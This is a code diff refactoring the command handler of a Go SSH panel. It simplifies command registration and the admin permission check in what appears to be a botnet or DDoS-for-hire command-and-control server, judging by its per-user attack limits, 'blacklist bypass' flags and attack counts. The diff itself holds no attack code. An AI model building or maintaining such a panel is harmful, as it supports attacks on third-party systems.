@@ -3,10 +3,7 @@ package handlers
 import (
 	"fmt"
 	"io"
-	"log"
-	"strconv"
 	"strings"
-	"time"
 
 	"arismcnc/commands/cmds"
 	"arismcnc/database"
@@ -16,13 +13,14 @@ import (
 	"github.com/gliderlabs/ssh"
 )
 
+// CommandHandler routes user input to registered commands
 type CommandHandler struct {
 	commands map[string]cmds.Command
 	db       *database.Database
 	session  ssh.Session
 }
 
-// NewCommandHandler initializes CommandHandler with a database reference and session context
+// NewCommandHandler initializes CommandHandler with all registered commands
 func NewCommandHandler(db *database.Database, session ssh.Session) *CommandHandler {
 	handler := &CommandHandler{
 		commands: make(map[string]cmds.Command),
@@ -33,25 +31,17 @@ func NewCommandHandler(db *database.Database, session ssh.Session) *CommandHandl
 	return handler
 }
 
-// Load commands and their aliases into the command handler
+// loadCommands registers all commands and their aliases
 func (ch *CommandHandler) loadCommands() {
-	// Automatically load all commands from cmds.CommandMap
 	for _, command := range cmds.CommandMap {
-		ch.registerCommand(command)
-
-		// Register each alias for the command
+		ch.commands[command.Name()] = command
 		for _, alias := range command.Aliases() {
 			ch.commands[alias] = command
 		}
 	}
 }
 
-// Register commands in the handler
-func (ch *CommandHandler) registerCommand(command cmds.Command) {
-	ch.commands[command.Name()] = command
-}
-
-// ExecuteCommand checks if the command is admin-only and whether the user is authorized
+// ExecuteCommand checks permissions and runs the matched command
 func (ch *CommandHandler) ExecuteCommand(input string, output io.Writer) {
 	args := strings.Fields(input)
 	if len(args) == 0 {
@@ -68,36 +58,13 @@ func (ch *CommandHandler) ExecuteCommand(input string, output io.Writer) {
 		return
 	}
 
+	// Admin permission check
 	if command.AdminOnly() {
 		userInfo := ch.db.GetAccountInfo(ch.session.User())
 		if userInfo.Admin != 1 {
-			expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
-			if err != nil {
-				log.Print(err)
-			}
-
-			insufficientPermissionsBrand := utils.Branding(ch.session, "insufficient-permissions", map[string]interface{}{
-				"user.Username":            ch.session.User(),
-				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-				"user.Admin":               utils.CalculateInt(userInfo.Admin),
-				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-				"user.Private":             utils.CalculateInt(userInfo.Private),
-				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-				"user.SSH_Client":          ch.session.Context().ClientVersion(),
-				"user.Created_by":          userInfo.CreatedBy,
-				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-				"clear":                    "\x1b[2J \x1b[H",
-				"sleep": func(duration int) {
-					time.Sleep(time.Duration(duration) * time.Millisecond)
-				},
-			})
-			fmt.Fprintln(output, insufficientPermissionsBrand)
+			brandingData := BuildBrandingData(ch.session, ch.db)
+			msg := utils.Branding(ch.session, "insufficient-permissions", brandingData)
+			fmt.Fprintln(output, msg)
 			return
 		}
 	}
